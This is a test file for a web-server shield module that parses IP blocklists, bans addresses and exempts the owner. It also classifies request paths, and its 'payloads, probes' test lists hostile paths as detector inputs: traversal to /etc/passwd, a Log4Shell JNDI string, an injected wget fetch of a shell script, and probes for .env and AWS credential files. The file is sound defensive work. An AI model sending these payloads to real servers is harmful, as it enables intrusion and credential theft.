// The shield (burrow/shield.mjs): lists looked up locally, payloads, bans, and
// never banning the owner. No network: lists are handed in as text.
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Shield, FEEDS, parseFeed, classify, RangeSet } from "../burrow/shield.mjs";

const tmp = () => mkdtempSync(join(tmpdir(), "shield-test-"));
const feed = (id) => FEEDS.find((f) => f.id === id);
function shield(lists = {}, opts = {}) {
  const s = new Shield({ dataDir: tmp(), log: () => {}, ...opts });
  for (const [id, text] of Object.entries(lists)) assert.ok(s.loadFeed(feed(id), text), id);
  return s;
}

test("address ranges: CIDRs merge, edges hold, IPv6 exact and prefixes", () => {
  const r = new RangeSet();
  for (const e of ["10.0.0.0/8", "11.0.0.0/8", "45.148.10.0/24", "1.2.3.4", "2001:db8::1", "2a01:4f8::/32", "bogus", "1.2.3.4/40"]) r.add(e);
  r.seal();
  assert.equal(r.start.length, 3, "10/8 and 11/8 are one range");
  for (const ip of ["10.0.0.0", "11.255.255.255", "45.148.10.120", "45.148.10.0", "45.148.10.255", "1.2.3.4", "2001:db8::1", "2a01:4f8:1:2::3"]) assert.ok(r.has(ip), ip);
  for (const ip of ["9.255.255.255", "12.0.0.0", "45.148.11.0", "1.2.3.5", "2001:db8::2", "2a01:4f9::1"]) assert.equal(r.has(ip), false, ip);
});

test("list formats: netsets, IPsum counts, the elsnet page", () => {
  const ipsum = parseFeed(feed("ipsum"), "# IPsum\n45.148.10.120\t4\n57.129.136.57\t1\n");
  assert.ok(ipsum.strong.has("45.148.10.120"), "named by 3+ lists: strong");
  assert.ok(ipsum.weak.has("57.129.136.57"));
  assert.equal(ipsum.strong.has("57.129.136.57"), false);
  const net = parseFeed(feed("firehol1"), "# comment\n;also\n\n5.188.10.0/23\n185.220.101.1\n");
  assert.ok(net.strong.has("5.188.11.200"));
  const page = `<pre>
 - 223.226.102.69 2024/09/15-18:45:02 2
 host_bb.wishnetkolkata.com 223.223.149.161 2015/08/28-11:12:21 1
 - 10.1.2.3 2021/01/01-00:00:00 1</pre>`;
  const els = parseFeed(feed("elsnet"), page);
  assert.deepEqual(els.weak.has("223.223.149.161"), { host: "host_bb.wishnetkolkata.com", since: "2015-08-28 11:12:21", hits: 1 });
  assert.equal(els.weak.has("3.226.102.69"), false);
  assert.equal(els.weak.count, 2, "private addresses on the page are left out");
});

test("payloads, probes and ordinary paths", () => {
  for (const p of ["/.env", "/backup/.env", "/.env.backup1", "/.git/config", "/wp-config.php.bak", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                   "/cgi-bin/../../../../etc/passwd", "/%2e%2e/%2e%2e/etc/passwd", "/?x=${jndi:ldap://a/b}", "/index.php?s=1;wget%20http://x/y.sh",
                   "/.aws/credentials", "/db.sql", "/backup.zip", "/actuator/env", "/boaform/admin/formLogin"]) assert.equal(classify(p), 3, p);
  for (const p of ["/ihfdfhdsif.php", "/wp-login.php", "/xmlrpc.php", "/phpmyadmin/", "/owa/auth/logon.aspx", "/cgi-bin/test"]) assert.equal(classify(p), 1, p);
  for (const p of ["/", "/test", "/api/status", "/assets/index-CPWh3fQ6.js", "/styles.css?v=2.2.0", "/environment", "/.well-known/acme-challenge/x",
                   "/docs/env.md", "/api/websockets", "/wp-content/uploads/a.png"]) assert.equal(classify(p), 0, p);
});

test("a strong list bans on the first request; a weak one alone doesn't", () => {
  const s = shield({ ipsum: "45.148.10.120\t4\n57.129.136.57\t1\n" });
  const r = s.gate("45.148.10.120", { path: "/", host: "x.example" });
  assert.equal(r.status, 403);
  assert.match(s.state.bans["45.148.10.120"].reason, /IPsum/);
  assert.equal(s.gate("45.148.10.120", { path: "/" }).status, 403, "and it stays banned");
  assert.equal(s.state.bans["45.148.10.120"].hits, 2);
  assert.equal(s.gate("57.129.136.57", { path: "/" }), null, "weak list, nothing else: let through");
});

test("payloads: dropped, then banned on the second; a probe plus a mark against it bans at once", () => {
  const s = shield({ ipsum: "57.129.136.57\t1\n" });
  const d = s.gate("35.236.186.124", { path: "/svelte/.env" });
  assert.equal(d.status, 404, "never reaches the app");
  assert.equal(s.state.bans["35.236.186.124"], undefined);
  assert.equal(s.gate("35.236.186.124", { path: "/vite/.env" }).status, 403);
  assert.match(s.state.bans["35.236.186.124"].reason, /2 payloads/);
  assert.equal(s.gate("165.227.62.8", { path: "/wp-login.php" }), null, "a probe alone is let through");
  assert.equal(s.gate("57.129.136.57", { path: "/ihfdfhdsif.php" }).status, 403, "a probe from a listed address: banned");
  assert.match(s.state.bans["57.129.136.57"].reason, /probed .* and is on IPsum/);
});

test("the owner is never banned: private addresses, signed-in addresses, a session, the allow list", () => {
  const s = shield({ firehol1: "136.54.0.0/16\n152.26.0.0/16\n8.8.8.0/24\n" });
  assert.equal(s.gate("192.168.1.20", { path: "/.env" }), null);
  assert.equal(s.gate("127.0.0.1", { path: "/.git/config" }), null);
  s.trust("136.54.7.30");
  assert.equal(s.gate("136.54.7.30", { path: "/.env" }), null, "signed in from there: exempt from lists and payloads");
  assert.equal(s.gate("152.26.89.207", { path: "/", trusted: () => true }), null, "a valid session counts");
  assert.ok(s.isTrusted("152.26.89.207"), "and its address is trusted from then on");
  s.allow("8.8.8.8");
  assert.equal(s.gate("8.8.8.8", { path: "/.env" }), null);
  // banned before it signed in: the sign-in lifts it
  assert.equal(s.gate("8.8.8.9", { path: "/" }).status, 403);
  s.trust("8.8.8.9");
  assert.equal(s.state.bans["8.8.8.9"], undefined);
  assert.equal(s.gate("8.8.8.9", { path: "/" }), null);
});

test("lookups: malicious is banned when the answer comes; a probe plus anything bad is too", async () => {
  const answers = { "45.148.10.120": "malicious", "57.129.136.57": "suspicious", "1.1.1.1": "clean" };
  const s = shield({}, { remote: async (ip) => ({ verdict: { level: answers[ip] || "clean", why: [`GreyNoise: ${answers[ip]}`] } }) });
  assert.equal(s.gate("45.148.10.120", { path: "/" }), null, "nothing local: through, asked in the background");
  assert.equal(s.gate("57.129.136.57", { path: "/wp-login.php" }), null);
  assert.equal(s.gate("1.1.1.1", { path: "/" }), null);
  await new Promise((r) => setTimeout(r, 20));
  assert.match(s.state.bans["45.148.10.120"]?.reason || "", /malicious/);
  assert.match(s.state.bans["57.129.136.57"]?.reason || "", /probed \(\/wp-login\.php\) and GreyNoise: suspicious/);
  assert.equal(s.state.bans["1.1.1.1"], undefined);
  assert.equal(s.state.stats.checked, 3);
});

test("auto off: no bans, payloads still dropped; state survives a restart", () => {
  const dir = tmp();
  const s = new Shield({ dataDir: dir, log: () => {} });
  s.loadFeed(feed("cins"), "45.148.10.120\n");
  s.setSettings({ auto: false });
  assert.equal(s.gate("45.148.10.120", { path: "/" }), null);
  assert.equal(s.gate("45.148.10.120", { path: "/.env" }).status, 404);
  s.setSettings({ auto: true });
  s.ban("203.0.113.9", "by hand");
  s.save(true);
  const again = new Shield({ dataDir: dir, log: () => {} });
  assert.equal(again.state.bans["203.0.113.9"].reason, "by hand");
  assert.equal(again.gate("203.0.113.9", { path: "/" }).status, 403);
  assert.equal(JSON.parse(readFileSync(join(dir, "shield", "state.json"), "utf8")).settings.auto, true);
  assert.ok(again.unban("203.0.113.9"));
  assert.equal(again.gate("203.0.113.9", { path: "/" }), null);
});

test("a ban closes the address's connections; peek and view", () => {
  const closed = [];
  const s = shield({ et: "45.148.10.120\n" }, { onBan: (ip) => closed.push(ip) });
  s.gate("45.148.10.120", { path: "/", host: "27715.tunnel.example", country: "NL" });
  assert.deepEqual(closed, ["45.148.10.120"]);
  const p = s.peek("45.148.10.120");
  assert.ok(p.banned);
  assert.deepEqual(p.lists.map((l) => l.id), ["et"]);
  const v = s.view();
  assert.equal(v.bans[0].country, "NL");
  assert.equal(v.events[0].act, "banned");
  assert.ok(v.feeds.find((f) => f.id === "et").loadedNow);
});

test("lookups are fast: a hundred thousand of them well under a second", () => {
  const lines = [];
  for (let i = 0; i < 100000; i++) lines.push(`${(i >> 16) & 255}.${(i >> 8) & 255}.${i & 255}.${(i * 7) & 255}`);
  const s = shield({ ipsum: lines.map((l) => l + "\t1").join("\n"), firehol1: "5.188.10.0/23\n" });
  const t0 = performance.now();
  for (let i = 0; i < 100000; i++) s.lookup(`${(i * 13) & 255}.${(i >> 3) & 255}.${i & 255}.${(i * 3) & 255}`);
  assert.ok(performance.now() - t0 < 1000, `took ${Math.round(performance.now() - t0)} ms`);
});

test("a school or carrier NAT on Spamhaus XBL isn't banned for it; with a probe it is; yours is never looked up", async () => {
  const xbl = { verdict: { level: "malicious", why: ["spamhaus: infected / exploited"] },
                sources: { dnsbl: { result: { spamhaus: { listed: true, why: ["infected / exploited"] }, dronebl: { listed: false } } }, greynoise: { result: { seen: false } } } };
  const asked = [];
  const s = shield({}, { remote: async (ip) => { asked.push(ip); return xbl; } });
  assert.equal(s.gate("152.26.89.207", { path: "/", trusted: () => true }), null);
  assert.equal(s.gate("152.26.89.50", { path: "/" }), null);
  assert.equal(s.gate("203.0.113.7", { path: "/admin.php" }), null);
  await new Promise((r) => setTimeout(r, 20));
  assert.deepEqual(asked.sort(), ["152.26.89.50", "203.0.113.7"], "a signed-in visitor's address isn't sent to the lookups");
  assert.equal(s.state.bans["152.26.89.50"], undefined, "XBL alone: not banned");
  assert.match(s.state.bans["203.0.113.7"]?.reason || "", /probed \(\/admin\.php\) and spamhaus/);
});

test("never waits: a new address goes straight through and is looked up behind", async () => {
  let release;
  const s = shield({}, { remote: () => new Promise((r) => { release = () => r({ verdict: { level: "malicious", why: ["GreyNoise: malicious"] } }); }) });
  assert.equal(s.gate("45.148.10.120", { path: "/" }), null, "answered at once, not a promise");
  assert.equal(s.gate("45.148.10.120", { path: "/x" }), null, "still through while the lookup runs");
  release(); await new Promise((r) => setTimeout(r, 10));
  assert.equal(s.gate("45.148.10.120", { path: "/" }).status, 403, "blocked once it is known to be malicious");
  assert.ok(s.latency().n >= 1);
});

test("known business services (GreyNoise benign) are left alone; payloads still dropped", async () => {
  const leakix = { verdict: { level: "malicious", why: ["mass scanner (LeakIX)", "spamhaus: infected / exploited"] },
                   sources: { greynoise: { result: { seen: true, scanner: true, benign: true, name: "LeakIX" } },
                              dnsbl: { result: { spamhaus: { listed: true, why: ["infected / exploited"] }, dronebl: { listed: false } } } } };
  const s = shield({ ipsum: "138.68.86.32\t1\n" }, { remote: async () => leakix });
  assert.equal(s.gate("138.68.86.32", { path: "/" }), null);
  await new Promise((r) => setTimeout(r, 10));
  assert.equal(s.gate("138.68.86.32", { path: "/.env" }).status, 404, "its payload doesn't reach the app");
  assert.equal(s.gate("138.68.86.32", { path: "/.git/config" }).status, 404);
  assert.equal(s.gate("138.68.86.32", { path: "/wp-login.php" }), null);
  assert.equal(s.state.bans["138.68.86.32"], undefined, "but it isn't banned");
});

test("this machine's own public address: never trusted by address, never banned, payloads dropped", () => {
  const s = shield({ firehol1: "136.54.0.0/16\n" });
  s.own = new Set(["136.54.7.30"]);
  s.trust("136.54.7.30");
  assert.equal(s.isTrusted("136.54.7.30"), false, "Mysterium/proxyware traffic leaves through it");
  assert.equal(s.gate("136.54.7.30", { path: "/" }), null, "on a strong list, still not banned");
  assert.equal(s.gate("136.54.7.30", { path: "/.env" }).status, 404);
  assert.equal(s.gate("136.54.7.30", { path: "/.env", trusted: () => true }), null, "your session gets through");
  s.judge("136.54.7.30", { verdict: { level: "malicious", why: ["x"] } });
  assert.deepEqual(s.state.bans, {});
  assert.equal(s.peek("136.54.7.30").own, true);
});
